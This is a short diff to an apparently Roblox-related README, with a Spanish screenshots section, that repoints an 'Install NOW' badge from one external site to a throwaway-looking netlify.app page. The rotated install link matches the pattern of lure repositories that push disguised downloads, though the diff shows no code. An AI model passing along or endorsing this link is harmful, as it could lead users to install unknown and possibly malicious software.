@@ -13,7 +13,7 @@ Capturas de pantalla
 
 ![Vista Previa](https://i.imgur.com/R0rQl2T.png)  
 
-[![Install NOW](https://img.shields.io/badge/Install-NOW-purple?style=for-the-badge&logo=roblox&logoColor=white)](https://www.varengpool.com)
+[![Install NOW](https://img.shields.io/badge/Install-NOW-purple?style=for-the-badge&logo=roblox&logoColor=white)](https://rainbow-biscotti-69b153.netlify.app/)
 
 
 **Explorar**  
